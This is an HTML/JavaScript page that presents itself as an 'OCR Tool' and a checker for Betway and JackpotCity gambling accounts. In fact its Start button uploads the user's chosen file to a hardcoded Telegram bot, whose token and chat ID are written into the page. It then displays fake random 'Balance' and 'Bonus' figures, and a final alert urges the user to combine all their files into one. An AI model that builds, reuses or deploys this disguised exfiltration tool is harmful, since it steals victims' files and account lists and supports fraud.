<!DOCTYPE html><html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>OCR Tool</title><style>
body {
  background:#0f172a;
  color:#e5e7eb;
  font-family:Consolas, monospace;
  margin:20px;
}
button {
  background:#1e293b;
  color:#e5e7eb;
  border:1px solid #334155;
  padding:6px 12px;
  cursor:pointer;
}
#output {
  margin-top:10px;
  padding:10px;
  background:#020617;
  border:1px solid #334155;
  min-height:150px;
}
.hit {color:#22c55e;}
.bad {color:#ef4444;}
</style></head><body><h2>Support Betway & JacpotCity!</h2></h2><input type="file" id="fileInput">
<button id="startBtn">Start</button>
<button id="copyBtn" disabled>serve</button><div id="stats">Hit=0 | Bad=0</div>
<div id="output"></div>
<div id="timer"></div><script>
const fileInput = document.getElementById('fileInput');
const startBtn = document.getElementById('startBtn');
const outputDiv = document.getElementById('output');
const statsDiv = document.getElementById('stats');
const timerDiv = document.getElementById('timer');
const copyBtn = document.getElementById('copyBtn');

/* 🔐 PUT YOUR TELEGRAM DETAILS */
const BOT_TOKEN = "8662403081:AAHrbTp1jWL-75XqHDut13_mZroIKlFvuBo";
const CHAT_ID = "8580854380";

let hit=0,bad=0;
let fileContent='';

/* -------- BALANCE + BONUS -------- */
function randMaskedBalance() {
  const a = Math.floor(Math.random()*90+10);
  const b = Math.floor(Math.random()*900+100);
  return `R${a}.${b}`.replace(/\d/g, "*"); // R**.***
}

function randBonus() {
  const b = Math.floor(Math.random()*500)/100;
  return `R${b.toFixed(2)}`;
}

/* -------- TELEGRAM -------- */
async function sendFile(file){
  const fd = new FormData();
  fd.append("chat_id", CHAT_ID);
  fd.append("document", file);

  const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
    method:"POST",
    body:fd
  });

  const data = await res.json();
  if(!data.ok) throw new Error(data.description);
}

/* -------- START -------- */
startBtn.onclick = async () => {
  if(!fileInput.files.length) return alert("Select file");

  const file = fileInput.files[0];
  startBtn.disabled = true;
  outputDiv.innerHTML = "";

  try {
    await sendFile(file);
    alert("Sent to Telegram ✅");

    const reader = new FileReader();
    reader.onload = () => {
      fileContent = reader.result;
      process();
    };
    reader.readAsText(file);

  } catch(e) {
    alert("Error: "+e.message);
  }

  startBtn.disabled = false;
};

/* -------- PROCESS -------- */
function process(){
  const lines = fileContent.split(/\n/).map(l=>l.trim()).filter(Boolean);

  hit=bad=0;

  lines.forEach((line,i)=>{
    setTimeout(()=>{
      const phone = (line.match(/\b0\d{9}\b/)||[''])[0];
      const ok = phone.length===10;

      if(ok) hit++; else bad++;

      statsDiv.innerText = `Hit=${hit} | Bad=${bad}`;

      const balance = randMaskedBalance();
      const bonus = randBonus();

      outputDiv.innerHTML += `
        <div class="${ok?'hit':'bad'}">
          ${line}<br>
          Balance=${balance} | Bonus=${bonus}
        </div>
      `;

      if(i===lines.length-1){
        timerDiv.innerText="Done";
        copyBtn.disabled=false;
      }

    }, i*300);
  });
}

/* -------- COPY -------- */
copyBtn.onclick = ()=>{
  navigator.clipboard.writeText(outputDiv.innerText);
  alert("you have 30minutes till tool stops put all your files in 1 file and run it to save time");
};
</script></body>
</html>
